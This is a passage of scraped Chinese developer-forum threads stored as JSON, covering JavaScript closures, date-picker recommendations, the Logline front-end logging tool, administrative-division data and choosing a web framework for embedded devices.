{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>例如这样的 一个 闭包作用于</p>\n<pre><code>$(function(){\n\tvar v1 = \"想要修改（访问）这个\"\n\t\n\tfunction pv1(){\n\t\tconsole.log(v1)\n\t}\n\t\n})\n\n// 有没有什么奇怪的方法在这个作用域拿到 $(function(){} 里的属性？\n\n[v1] = \"修改的值\"\n\n[pv1](); // 打印出'修改的值' 就对了\n\n</code></pre>\n<p>javascript 能做到这一点吗？</p>\n</div></div>"], "reply": "14", "tittle": "javascript 有没有办法从外部访问(修改) 闭包里的 属性", "comment": ["闭包里面的变量外面不能访问。你可以让闭包返回一个函数，调用函数修改 v1 的值。", "  嗯，我知道按常理是不能访问的，所以就想问问 有没有比较奇特的方法\r", "\r", "PS: 你用谷歌浏览器断点调试的时候 就可以修改闭包里面的变量", " 让闭包返回一个函数，外面调用函数修改 v1 的值。", "刚好碰到同样问题,也没找到办法\r", "但是有一个说法是在 JS 文件加载之前阻止,然后替换成一个修改过的\r", "也就是 JS 劫持", "1L 正解", "所以你其实是想修改一个局部变量。\r", "\r", "如果是简单数据类型，修改没意义吧，值引用的。如果是对象，确实可以通过闭包修改。然而正确的做法不是在对象里做接口吗。\r", "结论是你的想法就很独特", " 主要是想，从外部入侵别人的代码～～～实现修改～～～似乎除了拦截 js 并修改，别无它法～～", "在老版本浏览器里，你可以把 console.log 重写", "用 getter 与 setter", "如果是特殊原因的话，用 hack 点的方法，将这段代码 toString 后在代码里插入相应的 get 方法，然后 eval 就可以跑了", "当然如果不好 toString 的话可以直接拿 script 标签里的文本\r", "如果是写在 script 标签内的可以通过 innerHTML 拿\r", "如果是 js 文件可以用 $.get(\"hello.js\",function(text){alert(text)}) 的方式拿到\r", "后面做匹配插入文本和 eval 就很简单了", "参考这个 ", "  这样是可以跑～～～到是源代码里的环境并没有变啊～～比源代码设置了一个定时器～～～定时比对某个变量～～～\r", "你 eval 运行后只能是一个新的环境，新的定时器，原先的还在继续执行着", "不让他运行的方法太多了，举个例子，比如这个函数，是基于 domready 执行的晚的很，依赖于 jquery ，你在这个代码之前将 var $ = function(){} 就解决问题了，需要的时候引入 jquery ，这是一种方案，思路是不运行咯，当然有各种手段"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有兴趣可以看看</p>\n<p>github 地址： <a href=\"https://github.com/wepyjs/wepy-wechat-demo\" rel=\"nofollow\">https://github.com/wepyjs/wepy-wechat-demo</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "基于 wepy 框架开发的仿微信小程序", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>突然想到一个问题，在想是否有比较优雅的写法，或者什么工具支持：\n就是当我们去使用的一个 js 对象的时候，不考虑前面的层层逻辑，单单我要执行 data 下面的 callbackFn 方法，伪了防止 npe 的情况，那么我可能要这么写</p>\n<p>data &amp;&amp; 'function' == typeof data.callbackFn &amp;&amp; data.callbackFn();</p>\n<p>有没有比这种感觉看起来更好的写法的？</p>\n</div></div>"], "reply": "1", "tittle": "关于 js 判断对象接口是否存在的问题", "comment": ["打错，应该是节点"]},
{"content": ["<div class=\"topic_content\">需要同时支持时间以及日期的选择\r<br>时间的选择需要准确的选择时分秒,比如 ant.design 提供的 DatePicker(但是这东西依赖 react 并且没有单独出来的组件)\r<br>laydate 这个选择器对于 elem 选择比较麻烦, 我们需要做根据 dom 属性自动初始化</div>"], "reply": "9", "tittle": "求推荐款日期时间选择插件", "comment": ["mydate97,在现在框架中也不会觉得突兀", "楼上推荐的那个不错， 12306 用的就是", " \r", " \r", "刚去搜了下 mydate97 这款插件，似乎需要购买才能使用？", "bootstarp datepicker", "安利下我在用的，自己修改了一点 css 就能用到移动端。很适合自定义价格日历。\r", "我自己项目中用的是 bootstrap 的 datetimepicker. 自动初始化通过属性设定可以达到", "WdatePicker 日历控件 用过这个", "datetimepicker", "Bootstrap DateTime Picker"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>项目：<a href=\"https://github.com/latel/logline\" rel=\"nofollow\">https://github.com/latel/logline</a>，欢迎关注和 star 。</p>\n<p>从事 Web 前端同学对此肯定深有体会，代码发出去之后，犹如脱缰的野马，运行在万千的客户终端上，等到产品和后台反馈问题到我们这边，很多时候定位问题只能靠猜，尤其是一些偶发诱因，因为根本不知道用户是如何操作的，真实环境遇到的问题通常是很多随机因素叠加的形成的，因此很难回放用户的操作来还原现场找到原因。</p>\n<h2>现在的痛点</h2>\n<ul>\n<li>用户反馈问题后，虽然我们查询了 js 报错日志和 cgi 调用，但是并没有发现任何错误，我们根本不知道用户的终端上到底发生了什么。</li>\n<li>目前使用的 js 错误上报系统，看到上报有一定的延时，作为一款金融产品，分秒必争，这短暂的延时可能是致命的，我们必须快速的找到原因并予以修复。</li>\n</ul>\n<p>经过一段时间经验的累积，我们想到，如果我们有一个同后台一样详实的可分类和检索的代码运行日志，无疑将会提供巨大的帮助。</p>\n<h2>我们的探索</h2>\n<p><strong><em>一个健壮的日志系统大致包含日志记录、日志上传和日志分析三个主要部分，在这次的实践中，我们对这三方面都有所探索。</em></strong></p>\n<h3>日志到底存哪里?</h3>\n<p>由于前端受到很多限制，不能同 APP 一样可以在文件沙箱内存取文件，因此如何持久化的存储日志成了一个问题。目前 H5 也支持若干种本地存储方案， cookie, localStorage, indexedDB 和 websql 等，其他的由插件提供的能力不在考虑的范围之类，如 flash ，移动端的可用性会是一个很大的问题。</p>\n<ul>\n<li>\n<h4>Cookie</h4>\n<p>不用想，应该没有人会考虑吧, Cookie 的原则应该是尽可能的精简避免浪费带宽。</p>\n</li>\n<li>\n<h4>localStorage</h4>\n<p>localStorage 大家应该都很熟悉，一个简单的键值存储系统，接口简单实用，兼容性也非常的棒。但是考虑到目前很多项目都有使用 localStorage 来做缓存，而 localStorage 本身是有大小限制的。根据日志记录的细粒度，很可能会产生较多的日志内容，如果也记录在 localStorage 里，可能会有超出容量限制的风险。因此， localStorage 应该作为一个备用的持久化方案。</p>\n</li>\n<li>\n<h4>websql</h4>\n<p>websql 作为一项 W3C 标准，目前已经被废弃，但是各大桌面浏览器和移动端浏览器都有很好的实现这个接口，兼容性问题不大，底层基本上都是 sqlite （正是因为这样，作为一个 web 标准是不可接受的）。因而日志作为大量的结构化数据，应用场景非常的适合。经测试，在 iOS 上容量最大支持 50MB ，不过如果使用系统自带的 safari ，超过 5MB 时，会主动提醒用户是否要增加数据库的大小，不是很友好，不过微信里到是不会。想想 5MB 独占作为日志存储基本上够用了，处理好过旧日志的清理工作即可。因此我们觉得 websql 应当作为当前阶段主要的解决方案。</p>\n</li>\n<li>\n<h4>indexedDB</h4>\n<p>IndexedDB 是一种可以让你在用户的浏览器内持久化存储数据的方法，作为下一代的客户端结构化数据持久存储方案，足够的强大和高效，目前在各大浏览器中也有很好的支持，是未来用来替换 websql 的方案，应当在日后的迭代中主要支持，用来替代 websql 方案。</p>\n</li>\n</ul>\n<h3>什么样的日志格式堪称优雅?</h3>\n<ul>\n<li><strong>时间戳</strong>，这个无需多说，时间戳是日志的基本要义。</li>\n<li><strong>多会话</strong>，一个前端工程中可能同时存在多个独立的模块，这些模块很可能会同时互不干扰的记录各自的日志。如果每个模块都在自己的会话下记录日志，就不会相互干扰，并且提供了另一个维度的过滤能力。</li>\n<li><strong>错误等级</strong>，如 <code>info</code>, <code>warning</code>, <code>error</code>, <code>critical</code> 等，以提供最为基本的过滤能力。</li>\n<li><strong>描述符</strong>，如 <code>verify.request.start</code>, <code>submit.prevented</code> 等等。尽可能的以便用户一眼就可以知晓日志的大致内容，也方便代码中日志记录代码的可读性，也更易于在代码中搜索。</li>\n<li><strong>数据和详情</strong>，有时候一个简单的描述符并不能说明问题，可能需要记录更多的描述性文本或者数据来分析问题。</li>\n</ul>\n<h3>日志怎么获取？</h3>\n<p>由于我们并不需要实时的获取来自客户端的大量日志，因此日志是存储在用户客户端本地的，我们需要后台配合开发一个用于接收客户端通过网络上传的日志内容并存储起来的接口。同时可能要考虑一些安全性问题，如引入 token 机制和验证登录态等等。目前我们腾讯微证券采用的方案为：用户在微信公众号中发送消息“问题反馈”（直接使用日志上报等关键词可能会引起用户的反感），后台会返回日志上传页面地址链接，用户点击链接进入后，在获取登录态后自动上报日志。大家可以微信关注<code>腾讯微证券</code>公众号尝试一下。</p>\n<h3>日志如何分析？</h3>\n<p>由于 Logline 上传的日志格式符合标准，具有良好的可阅读性，因此我们可以在某种程度上直接使用命令行工具或者编辑器来阅读。但是对命令行不熟悉的用户使用可能仍然有困难，因此有必要使用 Web 技术栈搭建一个易于使用并且视觉良好的工具。我们希望这套工具可以不依赖与后端，既可以部署在服务器端，也可以当做本地网页直接双击打开，也可以被简单的包一层外壳而当做桌面 APP 来使用。</p>\n<p>作为日志，承载的最主要的内容便是大量的纯文本，在调研了一些方案后，我们认为 H5 规范中的 FileReader.readAsText 可以很好的做到这一点，结合拖放事件，我们便可以很大致构建出一个不错的方案：用户将一个或者多个日志文件拖放至网页中，即可对这些日志批量分析和检索。</p>\n<p>我们构建了一个仅供体验的版本 <a href=\"https://github.com/latel/logline-viewer\" rel=\"nofollow\">logline-viewer</a>。</p>\n<h2>Logline</h2>\n<p>基于以上工作，我们腾讯微证券项目组推出了自己的解决方案：<code>Logline</code>，一个轻量，实用和客户端级的前端日志记录工具。</p>\n<h2>DEMO</h2>\n<p><a href=\"http://kezhen.info/logline/example/\" rel=\"nofollow\">http://kezhen.info/logline/example/</a></p>\n<h2>应用场景</h2>\n<ul>\n<li>\n<p>回放用户细节操作</p>\n<p>真实应用场景下，用户的行为可能是不可预料的，甚至用户自己也无法记得自己的操作，有了日志，我们有了回放用户操作和代码运行状态的能力。</p>\n</li>\n<li>\n<p>核心流程监控</p>\n<p>在产品的一些核心流程中，我们可以在用户出错的情况下主动上传用户日志，以便我们可以快速统计和定位用户遇到的问题。</p>\n</li>\n<li>\n<p>主动抓取用户的日志分析用户行为</p>\n<p>有时候在用户不配合开发人员的时候，我们可以设计一种策略，比如我们在线上发布一个 json 文件，里面配置一个希望主动抓取日志的用户列表，当我们的产品在用户手机上被打开后，延时下载（避免影响主流程性能）这个 json ，当匹配当前用户时，直接主动上报该用户的日志。</p>\n</li>\n<li>\n<p>统计和辅助分析 JS 错误</p>\n<p>我们可以记录 js 的报错，包含调用队列一起记录，直接上传此错误日志或者在累计达到一个阈值的时候统一上传。</p>\n</li>\n</ul>\n<h3>特性支持</h3>\n<ul>\n<li>无外部依赖</li>\n<li>日志记录</li>\n<li>客户端级</li>\n<li>websql/localstorage/indexeddb 三种日志协议</li>\n<li>命名空间</li>\n<li>日志等级</li>\n<li>日志清理（防止日志过多，占用上传带宽和占满用户允许的内存）</li>\n</ul>\n<h2>快速上手</h2>\n<h3>1. 安装</h3>\n<h4>通过 bower</h4>\n<pre><code>bower install logline\n</code></pre>\n<h4>直接下载</h4>\n<p>访问 <a href=\"\" rel=\"nofollow\">https://github.com/latel/logline/releases</a>，选择需要的版本下载，引入自己的项目。</p>\n<h3>2. 引入脚本</h3>\n<p>Logline 支持直接使用 script 标签引用，也支持 AMD 模块加载器.</p>\n<pre><code>// Script 标签引入方式\n&lt;script src=\"./mod/logline.min.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\n\t// 使用 indexedDB 协议\n\tLogline.using(Logline.PROTOCOL.INDEXEDDB);\n&lt;/script&gt;\n\n// AMD 模块方式\nvar Logline = require('./mod/logline.min');\n</code></pre>\n<h3>3. 选择日志协议</h3>\n<p>目前一共支持三个协议， 三个协议都被直接挂载在 Logline 对象上以便一些特殊的应用场景，也更好的符合语义化:</p>\n<ul>\n<li>websql: Logline.PROTOCOL.WEBSQL</li>\n<li>indexeddb: Logline.PROTOCOL.INDEXEDDB</li>\n<li>localstorage: Logline.PROTOCOL.LOCALSTORAGE</li>\n</ul>\n<p>你可以在引入 Logline 之后，使用 <code>using</code> 主动选定一个期望使用的日志协议。</p>\n<pre><code>Logline.using(Logline.PROTOCOL.WEBSQL);\n\n</code></pre>\n<p>如果你没有提前选择一个日志协议，那么当你调用 Logline 的相关 API 时， Logline 会根据你在构建时给定的参数作为优先级来选择可用的优先级最高的协议。\n比如你的自定义构建命令是<code>npm run configure -- --with-indexeddb --with-websql --with-localstorage</code>，\n如果 indexeddb 协议可用，那么 indexeddb 将作为自动选择的协议。\n如果 indexeddb 协议不可用但是 websql 协议可用，那么将选择 websql 协议，如此类推。\n如果最后发现所有的协议都不可用，将会抛出错误。</p>\n<h3>4. 记录日志</h3>\n<pre><code>// 不同的模块使用不同的日志会话\nvar spaLog = new Logline('spa'),\n\tsdkLog = new Logline('sdk');\n\n// 不包含数据的，描述为 init.succeed 的记录\nspaLog.info('init.succeed');\n\n// 包含错误描述数据，描述为 init.failed 的记录\nspaLog.error('init.failed', {\n\tretcode: 'EINIT',\n\tretmsg: 'invalid signature'\n});\n\n// 不包含数据的，描述为 outdated 的记录\nsdkLog.warning('outdated');\n\n// 包含错误描述数据，描述为 system.vanish 的记录\nsdkLog.critical('system.vanish', {\n    // debug infos here\n});\n</code></pre>\n<h3>5. 读取日志</h3>\n<pre><code>Logline.getAll(function(logs) {\n    // process logs here\n});\n</code></pre>\n<h3>6. 清理日志</h3>\n<pre><code>Logline.keep(.5); // 保留半天以内的日志，如果不传参则清空日志\nLogline.clean(); // 清空日志并删除数据库\n</code></pre>\n<h3>7. 自定义数据库名</h3>\n<p>由于 indexeddb, websql 和 localStorage 都是同域共享的，这时候 Logline 默认的数据库名 logline 可能会已经被占用，需要指定一个新的数据库名。\n可以通过下面 2 个方法指定数据库名。</p>\n<pre><code>// 调用`using`时，同时指定第二个参数作为数据库名\nLogline.using(Logline.PROTOCOL.WEBSQL, 'newlogline');\n\n// 调用`database`来指定数据库名\nLogline.database('newlogline');\n</code></pre>\n<h2>自定义构建</h2>\n<p>目前 Logline 一共实现了<code>localstorage</code>、<code>websql</code>和<code>indexeddb</code>三个日志协议，默认是全部打包，可能你只想使用其中某个协议而已，你可以通过<code>npm run configure</code>来自定义构建你需要的版本。这样有利于减小包的大小。</p>\n<pre><code>// 不跟参数默认构建所有协议\nnpm run configure\n// 配置你需要的协议，去掉不需要的协议申明--with-xxx\nnpm run configure -- --with-localstorage --with-websql --with-indexeddb\n// 重新打包\nnpm run build\n// 去 dist 目录寻找新构建的打包文件\n</code></pre>\n<h2>我们都在用</h2>\n<p><img alt=\"腾讯微证券\" src=\"https://wzq.tenpay.com/weixin/v1/pic/logo/common.png\"></p>\n<h2>在腾讯微证券中使用的案例</h2>\n<h3>开户流程监控</h3>\n<p>开户流程作为核心的流程之一，一直以来都有着比较完善的监控数据，在某次改版之后，我们发现用户开户提交失败的比例有着显著的上升，很多用户在最终提交开户资料时，后端校验发现某些用户资料尚未被设置这种情况很让我们困惑。也是促使我们开发这个工具原因。在部署了 Logline 这套方案后，我们在开户流程的代码中添加了较为详实的日志记录，并在出错的情况下主动上报日志到后端。发现是在某些机型中，用户点击下一步后，全局的 loading 遮罩显示较慢，导致用户快速连续 2 次点击了下一步，导致开户流程控制器连续 2 次触发下一步操作，使得某些页面被跳过导致。</p>\n<h3>修复 JS 报错</h3>\n<p>目前和财付通很多前端产品一样，我们接入了财付通统一日志上报平台，但是我们上传的内容很有限，访问性能也不是很好，也没法看到 js 错误的调用队列，甚至没法看到用户的 useragent 。在使用我们自己的 Logline 上报系统后，这一切都得到了解决，发现了一些由微信 jssdk 自身产生的错误如 'WeixinJSBridge is not defined'和一些上报量比较大的 js 错误，有效的保证了代码的质量，甚至还可以做一个错误实时曲线统计。</p>\n<h3>基于配置的主动抓取</h3>\n<p>由于产品正处于快速的功能迭代中，目前不论是业务代码还是核心模块的代码都会经常被改动，不可避免的会产生一些意想不到的问题。有时候，我们会去找到用户希望用户配合帮忙定位问题，但是并不是所有的用户都会愿意配合。于是我们设计了一套主动抓取用户日志的策略：在我们的产品页面被打开后，会延时一定的时间去下载一个 logcat.json 的文件，文件中会包含我们期望可以主动上报日志的用户列表，当和用户吻合时，该用户的日志将会被自动上传。在需要的时候，我们只需要维护这样一个配置文件即可，当配置中的用户日志被上传后，我们将会受到一封邮件提醒。也可以使用此配置文件来配置客户端 JS 是否要自动上报 js 错误。</p>\n<h2>CONTRIBUTING</h2>\n<p>我们相信前端的社区应该是开放和合作的。</p>\n<h3>Logline - 日志记录和上报模块</h3>\n<p><a href=\"https://github.com/latel/logline\" rel=\"nofollow\">logline</a></p>\n<h3>Logline-viewer - 日志分析平台</h3>\n<p><a href=\"https://github.com/latel/logline-viewer\" rel=\"nofollow\">logline-viewer</a></p>\n<h2>WIP</h2>\n<p>[ ] 不使用 webpack 编译，以减小打包文件的大小\n[√i] 加入 bower 包管理器\n[ ] 丰富英文代码注释\n[ ] 完善错误处理细节\n[ ] 测试环境由 jsdom 迁移至 phantomjs\n[ ] 优化存取结构</p>\n<h2>未来规划</h2>\n<p>在这次的实践中，我们有意保持模块的独立性，并没有使用任何外部依赖，因此很容易复用到别的业务或者绑定自己的业务逻辑。不过在未来，我们更喜欢 Logline 作为前端日志的一整套解决方案提供，而无需业务在上传和分析部分要做出自己的实现。</p>\n<p>更为可用的应用场景应该是业务放在我们的平台上申请一个 appid ，然后使用我们的统计脚本，所以日志将统一上报到我们的平台，业务方可以使用此 appid 在我们的系统中浏览、分析和检索所需的日志。</p>\n<p>本方案使用的技术和实现难度并不困难，重要的是一种解决痛点的思路。</p>\n</div></div>"], "reply": "4", "tittle": "撸了一个前端的日志工具", "comment": ["很强大，解决了很多人的困扰啊，感谢分享。", "mark", "不错，正需要用到，研究下", "mark"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚刚看了下新闻，成都和重新的行政区划竟然有了调整！索性又更新了下数据库：\n<a href=\"https://github.com/mumuy/data_location\" rel=\"nofollow\">https://github.com/mumuy/data_location</a></p>\n<p>开发必备，行政区划信息更新到今天为止～</p>\n</div></div>"], "reply": "24", "tittle": "最新行政区划信息", "comment": ["一直不知道爲啥國內要把 “縣” ”市“ 顛倒過來。", "国内市分为地级市和县级市，没有颠倒，而是行政等级不一样", " 国内市分为地级市和县级市，没有颠倒，而是行政等级不一样", "为负责任的老哥点个赞", " \r", "\r", "對啊行政等級反過來了嘛。。。當初到底是誰幹的？\r", "\r", "直轄市\r", "省轄市\r", "縣轄市\r", "\r", "變成\r", "直轄市（這個沒變）\r", "好像沒有省轄市了？\r", "！市轄縣。。。", " 没有县辖市这个玩意儿，只有县级市", "成都还是没有天府新区  不是说要变成行政区的吗 搞不清了", "有意思，你不提还没注意到 @", " \r", "1983 年前，地级行政区包括盟、自治州、地区、省辖市。地区、盟作为“地级行政区”类型属虚级。省辖市的行政地位一般认定与“地区”相当，官方统计多作为“市”——同时作为区划和城市的概念。\r", "1983 年开始推行地级行政区划改革，“省辖市”开始改为“地级市”，全面推行“市管县”和“市管市”，并将“地级市”完全纳入“地级行政区”，“地级行政区”由虚转实演变为第二级地方行政区划。随之出现全局性的地市合并——建立中心城市。至 1986 年，地级市达到 166 个，占 324 个地级行政区的 51.2 ％，成为地级行政区的主体。\r", "\r", "地市合并，指“地区”和“地级市”合并。对“地区行政公署”和“地级市政府”同驻一个中心城市的情况合并为一个“地级市”。\r", "\r", "“撤地建市”，撤销地区，成立新的地级市。撤地建市亦称为“地改市”，即地区成建制改为地级市，新的地级市承袭原地区的辖域。", "县级行政区，这么定的\r", "\r", "按省、县、乡三级行政区划制度划分，县级行政区属于第二级行政区，为直辖市的下级行政区划单位。\r", "\r", "按省、地、县、乡四级行政区划制度划分，县级行政区属于第三级行政区，属于省、自治区所辖地级行政区的下级行政区划单位。", " \r", " \r", "對的，這兩個行政區級別表述的顛倒就是最近幾十年的事情。\r", "按照這兩個字的字面解釋也是“縣”大於“市”\r", "\r", "平時習慣了還好，但是在翻譯或者看以前的文獻的時候這樣直覺性的顛倒就很煩。。\r", "譬如中轉英就會變成 City › County 。。然後怎麼看怎麼奇怪~後來就直接不要 City 和 County ，只拼音 XXShi ， XXXian", " 没有正式挂牌成立人民政府，就不算行政区！", " \r", "\r", "因为自古以来整个中国已经建立了一千多个县", " 外国人不习惯的话，让他们改变一下习惯就好了。", " 这边的数据都是旧的！！！我的都是最新的", "中山市 没采集到区的信息", "510185\t    简阳市 划到成都了\r", "\r", "民政部的更新的快\r", "\r", "\r", " 中山市下面的东西南北石岐区其实是“街道”，因为中山是仅有的几个不设限的地级市。", " 有几个城市本身没有区的", " 我本来就是在这个基础上加上自己收集的，有很多民政局没有统计进去的", "我们这边跟一些 zf 机构对接都必须要用国家统计局的数据", " 和那边的数据没什么关系啦，只要是国家标准 GB/T2260 就可以，国家统计局数据更新慢，民政局快\r", "代码都是统一的", " 对，现在中国是非要搞到县这个名字只在边远地区才有才罢休？（一个刚刚县改区的地方）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>SegmentFault 的<a href=\"https://segmentfault.com/user/settings?tab=card\" rel=\"nofollow\">个性名片</a>做的很不错，模仿它的样式，做了一个 Github 的个性名片： <a href=\"https://github.com/xuelangZF/GithubCard\" rel=\"nofollow\">https://github.com/xuelangZF/GithubCard</a> 。</p>\n<p><img alt=\"\" src=\"http://oewvfiqrg.bkt.clouddn.com/GithubCard.png\"></p>\n<p>可以在我的博客预览效果： <a href=\"http://selfboot.cn/aboutme.html\" rel=\"nofollow\">http://selfboot.cn/aboutme.html</a></p>\n<p>（不知道这个算侵权吗？侵权删！）</p>\n</div></div>"], "reply": "4", "tittle": "在自己的博客中添加 Github 个性名片", "comment": ["用了 github 的 API 吧，哈哈，不是很男", " 嗯，没难度的。只是觉得放博客上挺不错的。", " 开始用的这个，感觉样式和 SF 的不搭，就照 SF 的样式搞了一个。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如 WeakMap 为了不让 JS 知道 GC 何时触发不许被遍历。</p>\n<p>原帖： <a href=\"https://www.zhihu.com/question/53455366\" rel=\"nofollow\">https://www.zhihu.com/question/53455366</a></p>\n</div></div>"], "reply": "1", "tittle": "为什么不许 JS 监听其 GC？", "comment": ["\r", "\r", "大意是说这样一定程度上可以防止攻击者探测系统当前状态，减少一个 side channel"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>GitHub: <a href=\"https://github.com/houfeng/mokit\" rel=\"nofollow\">https://github.com/houfeng/mokit</a></p>\n</blockquote>\n<p>Mokit 最初编写于 2012 年，是一个面向移动应用的前端 mvc 框架， v3 版本进行了大量的重构或重写，并尽可能的保持了和之前版本类似的 API ，\nv3 是一个「极轻量」的 MVVM 框架，相较目前主流的类似的框架(react/vue/angular)， mokit v3 更为「轻量」，希望为开发人员提供多一种的选择。</p>\n\n<h2>相较 v2 主要变化</h2>\n<ul>\n<li>MVC -&gt; MVVM</li>\n<li>重写模板引擎（由字符模板改为 DOM 模板），新增支持双向绑定</li>\n<li>原来的 View 类改为 Component ，同时取消了 Controller 类</li>\n<li>options 选项改为 properties ，并支持计算属性</li>\n<li>onRender 生命周期函数改为 onReady</li>\n<li>新增支持 data 选项</li>\n<li>新增支持 watches 选项</li>\n<li>分拆 template 选项功能，不再自动检查是否为 Element ，同时新增 element 选项</li>\n<li>指令默认前缀由 <strong>data-</strong> 改为 **m:**，同时自定义指令</li>\n</ul>\n<h2>特性</h2>\n<ul>\n<li>面向移动设备，内置支持常用「手势事件」并可以轻松添加自定义事件。</li>\n<li>极其轻量「核心 + 手势 API + Router 」仅 <strong>13k</strong> (uglify+gzip)</li>\n<li>提供类 WebCompoents 的支持，并支持「组件继承」</li>\n</ul>\n<h1>Hello world</h1>\n<p>HTML:</p>\n<pre><code>&lt;div id=\"app\"&gt;\n  &lt;input type=\"text\" m:model=\"name\" /&gt;\n  &lt;button m:on:tap=\"say(name)\"&gt;click me&lt;/button&gt;\n&lt;/div&gt;\n</code></pre>\n<p>JavaScript:</p>\n<pre><code>//启动应用\nmokit({\n  element: document.getElementById('app'),\n  data:function(){\n    return {\n      name: '世界'\n    };\n  },\n  say: function (name) {\n    alert('hello '+ name);\n  }\n}).start();\n</code></pre>\n<h1>定义组件</h1>\n<p>编写组件:</p>\n<pre><code>//定义一个 hello 组件\nvar Hello = new mokit.Component({\n  template: '&lt;button m:on:tap=\"say(name)\" m:content&gt;&lt;/button&gt;',\n  properties: { name: null},\n  say: function (name) {\n    alert('hello '+ name);\n  }\n});\n</code></pre>\n<p>HTML:</p>\n<pre><code>&lt;div id=\"app\"&gt;\n  &lt;m:hello m:prop:name=\"name\"&gt;click me&lt;/m:hello&gt;\n&lt;/div&gt;\n</code></pre>\n<p>JavaScript:</p>\n<pre><code>//启动应用\nmokit({\n  element: document.getElementById('app'),\n  components:{ Hello: Hello }\n  data:function(){\n    return {\n      name: '世界'\n    };\n  }\n}).start();\n</code></pre>\n<h1>在线示例</h1>\n<ul>\n<li><a href=\"http://houfeng.net/mokit/examples/todo\" rel=\"nofollow\">Todo</a></li>\n<li><a href=\"http://houfeng.net/mokit/examples/route\" rel=\"nofollow\">Route</a></li>\n<li><a href=\"http://houfeng.net/mokit/examples/transition\" rel=\"nofollow\">Transition</a></li>\n</ul>\n<h1>规划</h1>\n<ul>\n<li>支持服务端渲染</li>\n</ul>\n</div></div>"], "reply": "6", "tittle": "一个 MVC 框架以 MVVM 之「魂」复活了！", "comment": ["First\r", "看起来不错，有机会试试看", "果然是一年三个新框架 🤓", "MVVM 好！", "有点怕", " 怕什么？", " 选型困难。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看页面代码， facebook 的视频是 canvas ， Twitter 的没看出来。\n想了解具体原理是什么，或者从哪方面下手。</p>\n</div></div>"], "reply": "6", "tittle": "Twitter 和 Facebook 视频的实现原理是什么？", "comment": ["iframe 引入 ", "\r", "里面有一些配置项，其中视频地址 ", " 谢谢，我去看下", " 这个可以有", " +1", " 为了缩短加载时间，使用 iframe 外链，我这样理解对不对"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>支持 PC 访问类似于 TPLINK 等路由器的配置界面，需要查看数据、查看简单图表。\n看了下貌似有很多方案， React 、 Vue 、 Angularjs ， JQuery 等等，头大……\n只会基础的 Html 和 JavaScript ，哪个容易上手？\n资源放在嵌入式设备里面，所以追求轻量化，最好能兼顾移动端的</p>\n</div></div>"], "reply": "27", "tittle": "求助，嵌入式设备内嵌一个 web app，用什么前端框架合适？", "comment": ["刚毕业的时候做过路由器的控制界面，用 JQ + bootstrap 三天交货。图标用 chart.js 。不过那时候还没有什么鬼 react/vue 的东西。感觉如果新手的话， JQ 还是比较友好的，兼容性也说得过去", "轻量化的还是选择 Vue 好一些，兼顾移动端，可以参考这个： ", "java 写的多的话 ng2 好上手，看文档 vue 也很好上手， react 不想多说，坑多，当然，最快最简单的还是 jq ，毕竟不折腾", "直接套个 bootstrap 现成模板完事", "React 门槛高，不想入坑不推荐。你这种用传统的后端渲染就行了吧。", "有一点很重要，代码量一定要小，小，小。\r", "\r", "我记得之前做路由器的时候，只有几百 K 的存储；\r", "而且静态资源传输也会影响路由器性能吧。\r", "\r", "另一个难题是路由器没有 HTTP API （自己定制开发就另说了），所以一般是后端程序直接驱动 Web 内容（连渲染模板都算不上）。\r", "\r", "简单点，精简的 Bootstrap css + jqLite 如何？", "嵌入式设备其实无需太多在意前端框架的量级。\r", "\r", "因为，即使使用 gohead 、 boa 之类的嵌入式 web server ，对前端来说，也几乎是透明。\r", "\r", "只要控制好，不需要加载过多文件就好了。\r", "\r", "举个例子，你页面里面有 1 个图片，一个很重的 jQuery ，对嵌入式设备来说，开销其实要比 10 个图片，一个轻量级的 vue 来的省。\r", "\r", "\r", "另，欢迎来到 C++写 CGI 的世界~~~呵呵", "jquery 吧，发布后反正也没打算更新了，\r", "而且用户更新路由器软件的机会很小，自动更新会导致断网等情况，客户肯定是不愿意看到的", " 一般都是 lua 吧，谁会脚本程序也脑残到用 C++ 不是作死么？", "都既然是嵌入式系统的 app ， 你还引用框架= =。选型之前要考虑，你的嵌入式设备能消耗不？不然，就会得不偿失。", " 现在一般是 8M flash 起步吧， 16M 也不贵，而且 容量越大 软件开发的成本越低，毕竟可以上 linux 了，开源一大抄\r", "倒是一些存储空间不能看的路由器 用的 VxWorks 简直要吐血", " 不消耗，渲染都是浏览器完成，路由器只负责数据跟文件", "参考 openwrt 后台\r", "\r", "用 bootstrap+jQ", "如果觉得 jQuery 文太大（ 84K ）可以换 Zepto （ 9.6K ），用法和 jQuery 一样", " 我用 C++基于 http_parser 写了个简单的 HTTP Server ，用起来倒是够用", " 百度了下 CGI ，第一次听说这名词……确实是用 C++写了个 HTTP Server ，然后对外提供 json 格式的数据，方便客户端获取数据", "看大家的回复，看来 bootstrap + jQuery 组合推荐较多，这下有重点了，哈哈", " 引用框架写得快嘛，而且成熟的方案美观易用。我的设备只是存储静态文件，然后发给浏览器执行", " 后端渲染，也是第一次听说，原谅我前端知识的匮乏……我的情况应该是属于前端渲染，设备只存静态文件，浏览器请求文件后负责后续的任务。", " 嗯。其实我觉得不需要引用，一来省地方，二来页面应该不会有太复杂的逻辑", " 现在弄了块样板 128M nand flash ， ARM+Linux ，但后续出于成本考虑可能会砍掉变小。空间不足的情况确实很头疼，之前有个要求把 16M falsh 弄成 8M ，然后各种砍砍砍，搞得要吐血。", " 根据实际的存储空间要求， Bootstrap 和 jQuery 也可以做必要的精简", " 嵌入式设备使用 C/C++写 CGI 是很常见的。脑残这词可不对哈。举个例子，很多 CM3 、 CM4 的控制台都是 web service 。一般都是用 C/C++来实现 CGI 的。\r", "\r", " 个人经验推荐 boa ，这个写 cgi 会比较简单。量级也很轻。 gohead 也不错，可以试试。\r", "\r", 